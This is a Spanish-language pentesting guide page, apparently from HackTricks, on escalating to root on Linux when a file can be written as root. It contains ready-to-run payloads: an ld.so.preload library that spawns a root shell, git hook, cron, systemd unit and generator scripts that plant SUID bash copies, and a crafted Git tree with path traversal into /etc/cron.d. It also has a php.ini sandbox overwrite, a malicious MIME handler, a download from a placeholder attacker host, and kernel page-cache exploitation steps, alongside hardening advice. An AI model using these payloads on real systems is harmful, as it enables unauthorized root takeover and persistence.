# Escritura arbitraria de archivos como Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` es una lista de shared objects de todo el sistema que el dynamic linker carga antes que otros shared objects. El modo de ejecución segura aplica restricciones adicionales al preloading, por lo que una ruta de library como `/tmp/pe.so` no es una técnica SUID-binary universal.\
Si puedes crearlo o modificarlo, un proceso que cargue el archivo cargará la library indicada antes que sus otros shared objects, lo que permite la ejecución de código en el contexto de ese proceso.<sup>[[12]](#references)</sup>

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

Los **Git hooks** son scripts ejecutables que se ejecutan ante eventos en un repositorio, incluidas las operaciones de commit y merge. Si un **script o usuario privilegiado** realiza esas acciones y un atacante puede **escribir en la carpeta `.git`**, el hook puede utilizarse para la **escalada de privilegios**.<sup>[[13]](#references)</sup>

Por ejemplo, es posible **generar un script** en un repositorio git dentro de **`.git/hooks`** para que se ejecute siempre cuando se cree un nuevo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Traversal de rutas en la exportación de árboles de Git con privilegios

Un sincronizador privilegiado puede evitar un checkout y, en su lugar, enumerar un repositorio controlado por un atacante con `git ls-tree`, leer cada blob con `git cat-file`, unir la ruta indicada con un directorio de staging y escribirla él mismo. Esto se convierte en una **escritura arbitraria de archivos con los privilegios del sincronizador** cuando combina `-c safe.directory=*` (deshabilitando la protección de Git para repositorios con propietarios diferentes) con la ausencia de una comprobación de contención del destino. Un nombre de entrada del árbol absoluto hace que `os.path.join(stage, name)` de Python descarte `stage`; un nombre relativo que contenga `../` escapa cuando el sistema de archivos lo resuelve. Como la aplicación materializa el árbol sin procesar en lugar de pedirle a Git que lo compruebe, el rechazo de rutas durante el checkout nunca protege el destino.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Busca esta estructura de código en servicios root, timers, agentes de deployment, importadores de plantillas y trabajos de backup/restore:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Una entrada de árbol se codifica como `<mode> SP <name> NUL <raw object ID>`. La opción `git hash-object --literally` permite deliberadamente datos de objeto que el análisis normal o `git fsck` podrían rechazar, por lo que un clon desechable puede construir un árbol cuyo nombre de archivo sea un destino absoluto. Este ejemplo crea un blob de archivo cron, envuelve el árbol manipulado en un commit y mueve una rama hacia él; la explotación aún requiere permiso para actualizar un repositorio consumido por el job con privilegios y un servidor Git que acepte el objeto malformado.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
El hardening debe cubrir tanto la ingesta del repositorio como la operación final en el filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Reemplaza `safe.directory=*` por los repositorios exactos en los que el servicio debe confiar y ejecuta el procesamiento del repositorio sin privilegios de root siempre que sea posible.
- Rechaza los nombres absolutos y cualquier componente `.` o `..` antes de la materialización. Después de unir las rutas, canonicaliza y verifica que el destino permanezca dentro de la raíz prevista.
- Evita las condiciones de carrera de symlinks entre la comprobación y la apertura: abre de forma relativa a un descriptor de directorio de confianza y, en Linux, usa `openat2()` con `RESOLVE_BENEATH` y `RESOLVE_NO_SYMLINKS` para las rutas controladas por el atacante.
- Prefiere un checkout normal en un directorio aislado en lugar de reimplementar el checkout a partir de la salida de plumbing. Si es necesaria la ingesta de raw objects, habilita la validación del lado de recepción, como `receive.fsckObjects=true`; no rebajes los hallazgos relacionados con nombres de rutas de `receive.fsck.*` necesarios para rechazar árboles manipulados.

### Archivos de Cron y de tiempo

Si puedes **escribir archivos relacionados con cron que root ejecute**, normalmente puedes obtener ejecución de código la próxima vez que se ejecute el job. Entre los objetivos interesantes se incluyen:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- El crontab del propio root en `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- Timers de `systemd` y los servicios que activan

Comprobaciones rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Rutas de abuso típicas:

- **Añadir un nuevo cron job de root** a `/etc/crontab` o a un archivo en `/etc/cron.d/`
- **Reemplazar un script** que `run-parts` ya ejecuta
- **Convertir en backdoor un objetivo de timer existente** modificando el script o binario que lanza

Ejemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si solo puedes escribir dentro de un directorio de cron utilizado por `run-parts`, coloca allí un archivo ejecutable:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` normalmente ignora los nombres de archivo que contienen puntos, así que prefiere nombres como `backup` en lugar de `backup.sh`.<sup>[[15]](#references)</sup>
- Algunos sistemas usan timers de `systemd` en lugar del cron clásico, pero la idea del abuso es la misma: **modificar lo que root ejecutará más adelante**.<sup>[[20]](#references)</sup>

### Archivos de Service y Socket

Si puedes escribir **archivos de unidad de `systemd`** o archivos referenciados por ellos, es posible que puedas obtener code execution como root recargando y reiniciando la unidad, o esperando a que se active la ruta de activación del servicio/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Entre los objetivos interesantes se incluyen:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides drop-in en `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binarios de Service referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Rutas `EnvironmentFile=` modificables cargadas por un servicio root

Comprobaciones rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Rutas comunes de abuso:

- **Sobrescribir `ExecStart=`** en una unidad de servicio propiedad de root que puedas modificar
- **Añadir un drop-in override** con un `ExecStart=` malicioso y borrar primero el anterior
- **Añadir un backdoor al script/binario** al que ya hace referencia la unidad
- **Secuestrar un servicio activado por socket** modificando el archivo `.service` correspondiente que se inicia cuando el socket recibe una conexión

Ejemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flujo de activación típico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si no puedes reiniciar los servicios por ti mismo, pero puedes editar una unit activada por socket, quizá solo tengas que **esperar una conexión de cliente** para activar la ejecución del servicio con backdoor como root.<sup>[[17]](#references)</sup>

### Directorios de generadores de systemd

Los **generadores del sistema** son ejecutables que el system manager lanza antes de cargar los unit files, tanto durante el arranque como durante las recargas de configuración. Por lo tanto, el acceso de escritura a un directorio de generadores del sistema (o a un generador ejecutable existente) es un primitive directo de ejecución de código como root que es fácil de pasar por alto cuando una auditoría comprueba únicamente los archivos `*.service` y `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

El orden de búsqueda habitual es `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` y `/usr/lib/systemd/system-generators/` (algunas distribuciones exponen `/lib/systemd/system-generators/` mediante la unificación de `/usr`). Un ejecutable con el mismo nombre en un directorio anterior oculta al posterior. No confundas estos **directorios de ejecutables de entrada** con `/run/systemd/generator`, `/run/systemd/generator.early` y `/run/systemd/generator.late`, que contienen la salida de units transitorias producida por los generadores.<sup>[[35]](#references)</sup>

Comprobaciones rápidas:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Un generator recién creado debe tener establecido su bit ejecutable. Si la primitive de escritura controla los bytes, pero no el modo, apunta a un generator que ya sea ejecutable; truncarlo en el mismo lugar normalmente conserva sus metadatos. Si el directorio es escribible, crea una nueva entrada y márcala como ejecutable.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Activar `systemctl daemon-reload` contra el gestor del **sistema** requiere una autorización adecuada, pero vuelve a ejecutar todos los generadores del sistema; de lo contrario, espera a una recarga con privilegios, una operación de paquete o un reinicio. Los directorios de user-generators, como `~/.config/systemd/user-generators/`, se ejecutan bajo el gestor del usuario y, por sí solos, **no** proporcionan root.<sup>[[35]](#references)</sup>

Para hardening y hunting, verifica cada componente de la ruta y las ACL en lugar de comprobar únicamente los bits de modo finales, establece como referencia los hashes y la propiedad de los paquetes de los generadores, y genera alertas ante cambios de creación, renombrado, contenido o permisos en todos los directorios de entrada de los generadores del sistema. Monitorizar la escritura es importante porque un generador one-shot puede eliminarse después de ejecutarse, mientras que el árbol de unidades generado bajo `/run/systemd/generator*` se reconstruye en la siguiente recarga.<sup>[[35]](#references)[[36]](#references)</sup>

### Sobrescribir un `php.ini` restrictivo utilizado por un sandbox de PHP con privilegios

Algunos daemons personalizados validan el PHP proporcionado por el usuario ejecutando `php` con un **`php.ini` restringido** (por ejemplo, `disable_functions=exec,system,...`). Si el código del sandbox todavía tiene **cualquier primitive de escritura** (como `file_put_contents`) y puedes acceder a la **ruta exacta de `php.ini`** utilizada por el daemon, puedes **sobrescribir esa configuración** para eliminar las restricciones y después enviar un segundo payload que se ejecute con privilegios elevados.<sup>[[2]](#references)</sup>

Flujo típico:

1. El primer payload sobrescribe la configuración del sandbox.
2. El segundo payload ejecuta código una vez que las funciones peligrosas se han vuelto a habilitar.

Ejemplo mínimo (reemplaza la ruta utilizada por el daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si el daemon se ejecuta como root (o valida usando paths propiedad de root), la segunda ejecución produce un contexto de root. Esto es esencialmente una **escalada de privilegios mediante la sobrescritura de la configuración** cuando el runtime aislado aún puede escribir archivos.

### binfmt_misc

`binfmt_misc` expone registros en `/proc/sys/fs/binfmt_misc`; cada registro asocia un patrón de tipo de archivo con un intérprete. El impacto en los privilegios depende de quién puede modificar el registro y de qué proceso ejecuta posteriormente el archivo coincidente, por lo que debes verificar estos requisitos antes de considerarlo una vía de escalada de privilegios.<sup>[[21]](#references)</sup>

### Sobrescribir los schema handlers (como http: o https:)

Los entornos de escritorio utilizan asociaciones MIME y desktop entries para elegir una aplicación para los URI schemes; un atacante que pueda escribir en la configuración relevante por usuario y en los directorios de desktop entries puede redirigir esos schemes a un launcher bajo su control. Al modificar el archivo `$HOME/.config/mimeapps.list` para apuntar los handlers de URL HTTP y HTTPS a un archivo malicioso (por ejemplo, `x-scheme-handler/http=evil.desktop` y `x-scheme-handler/https=evil.desktop`), un clic del usuario puede invocar esa desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root ejecutando scripts/binarios modificables por el usuario

Si un workflow privilegiado ejecuta algo como `/bin/sh /home/username/.../script` (o cualquier binario dentro de un directorio propiedad de un usuario sin privilegios), puedes secuestrarlo:<sup>[[1]](#references)</sup>

- **Detecta la ejecución:** monitoriza los procesos con pspy para detectar a root invocando rutas controladas por el usuario.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** asegúrate de que tanto el archivo objetivo como su directorio sean propiedad de tu usuario o que este tenga permisos de escritura.
- **Hijack the target:** haz backup del binario/script original y coloca un payload que cree una shell SUID (o cualquier otra acción como root); después, restaura los permisos:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (por ejemplo, pulsar un botón de UI que genere el helper). Cuando root vuelva a ejecutar la ruta hijacked, obtén el shell escalado con `./rootshell -p`.

### Modificación de archivos de binarios privilegiados solo en la caché de páginas

Algunos bugs del kernel no modifican el archivo **en disco**. En su lugar, permiten modificar únicamente la **copia en la caché de páginas** de un archivo legible. Si puedes apuntar a un binario **setuid** o ejecutado de otro modo por **root**, la siguiente ejecución puede ejecutar bytes controlados por el attacker desde la memoria y escalar privilegios, aunque el hash del archivo en disco no haya cambiado.<sup>[[3]](#references)[[4]](#references)</sup>

Es útil considerar esto como una **primitive de escritura de archivo solo durante el runtime**:<sup>[[3]](#references)</sup>

- **El disco permanece limpio**: el inode y los bytes en disco no cambian
- **La memoria está dirty**: los procesos que leen o ejecutan la página en caché obtienen el contenido modificado por el attacker
- **El efecto es temporal**: el cambio desaparece tras reiniciar o expulsar la caché

Esta primitive se sitúa entre la **arbitrary file write** clásica y los bugs antiguos de **page-cache abuse**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependía de una race
- Dirty Pipe tenía restricciones sobre la posición de escritura
- Una primitive solo para la caché de páginas puede ser más fiable si la ruta vulnerable permite escrituras directas en páginas cacheadas respaldadas por archivos

#### Flujo genérico de privesc

1. Obtén una primitive del kernel que pueda escribir en **páginas de la caché de páginas respaldadas por archivos**
2. Úsala contra un **binario privilegiado legible** u otro archivo ejecutado por root
3. Activa la ejecución **antes de que la página sea expulsada de la caché**
4. Obtén ejecución de código como root mientras el archivo en disco siga pareciendo no modificado

Objetivos típicos de alto valor:

- Binarios **setuid-root**
- Helpers iniciados por **servicios root**
- Binarios ejecutados habitualmente desde **containers que comparten el kernel/la caché de páginas del host**

#### Ruta de ejemplo de AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) es un buen ejemplo de esta clase. La ruta vulnerable estaba en la API de userspace de criptografía de Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` puede mover referencias a páginas de la caché de páginas desde un archivo legible hacia la scatterlist TX de criptografía
- la ruta de descifrado in-place de `algif_aead` reutilizaba los buffers de origen y destino
- `authencesn` escribía entonces en la región de tag de destino
- cuando esa región todavía referenciaba páginas respaldadas por archivos obtenidas mediante `splice()`, la escritura terminaba en la **caché de páginas del archivo objetivo**

Por tanto, la técnica interesante no es la CVE en sí, sino el patrón:

- **introducir páginas cacheadas respaldadas por archivos en un subsistema del kernel**
- hacer que el subsistema las **trate como salida escribible**
- activar una pequeña sobrescritura controlada en memoria

El PoC público utilizaba **escrituras repetidas de 4 bytes** para parchear `/usr/bin/su` en memoria y después lo ejecutaba.<sup>[[4]](#references)[[7]](#references)</sup>

#### Ruta de ejemplo de ESP / XFRM + clonación TEE de netfilter

DirtyClone (CVE-2026-43503) muestra otra variante del mismo patrón de **page-cache-only write-to-root**, pero esta vez el sink es el **descifrado IPsec ESP** en lugar de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La técnica importante es el **paso de metadata-laundering**:

- `splice()` coloca una **página de la caché de páginas respaldada por un archivo y de solo lectura** en un paquete ESP-in-UDP
- la mitigación original de DirtyFrag marcaba ese skb con `SKBFL_SHARED_FRAG` para que `esp_input()` hiciera una **copia antes de descifrar**
- netfilter `TEE` duplica el paquete mediante `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- el clon conserva la **misma referencia física a la página de la caché de páginas**, pero pierde `SKBFL_SHARED_FRAG`
- `esp_input()` considera entonces que el clon es seguro y ejecuta el descifrado in-place de `cbc(aes)` sobre la página respaldada por el archivo

Por tanto, la lección para el reviewer es más amplia que la CVE: si una mitigación depende de **metadata del skb/página** para decidir si una operación debe hacer una copia primero, cualquier **ruta de clonación/copia que conserve la página subyacente pero elimine la metadata** puede volver a abrir silenciosamente la primitive de escritura.

Flujo de explotación típico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obtener **`CAP_NET_ADMIN` dentro de un network namespace privado**
2. activar loopback e instalar una regla **`TEE` de netfilter** en `mangle/OUTPUT`
3. instalar SAs de transporte XFRM ESP mediante `NETLINK_XFRM`
4. codificar cada palabra objetivo de 4 bytes en el campo `seq_hi` del SA (el truco de selección de palabras de DirtyFrag)
5. enviar el paquete ESP-in-UDP obtenido mediante `splice()` para que el **clon de TEE** llegue a `esp_input()` y descifre **in-place**
6. repetir hasta que la copia en la caché de páginas de `/usr/bin/su` u otro ejecutable privilegiado contenga código controlado por el attacker

Operativamente, el impacto es el mismo que en el ejemplo de `AF_ALG`: el archivo en disco permanece limpio, pero `execve()` consume los **bytes modificados de la caché de páginas** y proporciona root.<sup>[[8]](#references)[[9]](#references)</sup>

Comprobaciones de exposición útiles para esta variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La reducción de la superficie de ataque a corto plazo también es específica de la ruta: actualizar a un kernel que incluya `48f6a5356a33` corrige la ruta de clone, mientras que bloquear la carga automática de `xt_TEE` elimina el **paso de lavado de flags** y bloquear `esp4` / `esp6` elimina el **sumidero de descifrado**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposición y hunting

Si sospechas de esta clase de bug, no te bases únicamente en las comprobaciones de integridad del disco. Verifica también:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Los valores de configuración siguientes distinguen una interface loadable de una integrada en el kernel; las reglas de compilación de crypto asignan `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` puede cargarse o descargarse como módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: la interface está integrada en el kernel
- los binarios setuid son buenos objetivos porque un parche que solo afecte a la page cache puede bastar para convertir un foothold local en root

#### Reducción de la superficie de ataque para la ruta `algif_aead`

Si la interface vulnerable la proporciona un módulo loadable:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Si está compilado en el kernel, algunas divulgaciones informaron que bloqueaba la ruta init con:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Este tipo de mitigación también vale la pena recordar para otros kernel LPEs: si la explotación depende de una interfaz opcional específica, deshabilitar o poner esa interfaz en blacklist puede romper la ruta de explotación incluso antes de que esté disponible una actualización completa del kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — página del manual de Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentación del Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidad de la caché de páginas de AF_ALG del Linux Kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentación de Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentación de Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentación de configuración de Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — página del manual de Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentación de los generators de systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: mecanismos de persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
